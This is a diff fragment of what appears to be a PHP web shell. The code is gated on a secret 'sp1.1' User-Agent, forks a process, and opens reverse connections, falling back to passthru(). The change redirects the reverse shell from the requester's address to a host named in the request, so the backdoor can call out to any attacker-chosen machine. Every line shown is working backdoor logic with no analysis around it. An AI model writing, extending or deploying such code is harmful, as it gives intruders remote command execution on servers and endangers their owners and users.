@@ -407,13 +407,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
                 die("\n\n");
             } else {
                 pcntl_wait($status);
-                reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]);
+                reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
                 exit(0);
             }
         } else {
             echo "Cannot fork, as it does not exist on this system..... using passthru\n";
             $re = null;
-            passthru(reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]), $re);
+            passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
         }
     }
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
